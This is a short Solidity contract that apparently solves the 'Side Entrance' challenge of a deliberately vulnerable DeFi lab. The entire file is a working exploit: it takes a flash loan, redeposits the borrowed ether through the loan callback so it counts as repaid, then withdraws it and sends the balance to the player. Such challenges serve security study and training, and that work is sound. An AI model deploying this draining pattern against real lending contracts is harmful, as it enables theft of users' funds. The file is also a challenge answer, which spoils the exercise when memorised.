// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";


contract SideEntranceAttacker is IFlashLoanEtherReceiver{
    SideEntranceLenderPool pool;
    address payable player;

    constructor(address payable _pool, address payable _player) {
        pool = SideEntranceLenderPool(_pool);
        player = _player;
    }

    function attack(uint256 amount) external payable {
        pool.flashLoan(amount);
        pool.withdraw();
        SafeTransferLib.safeTransferETH(player, address(this).balance);
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    fallback() external payable {}

}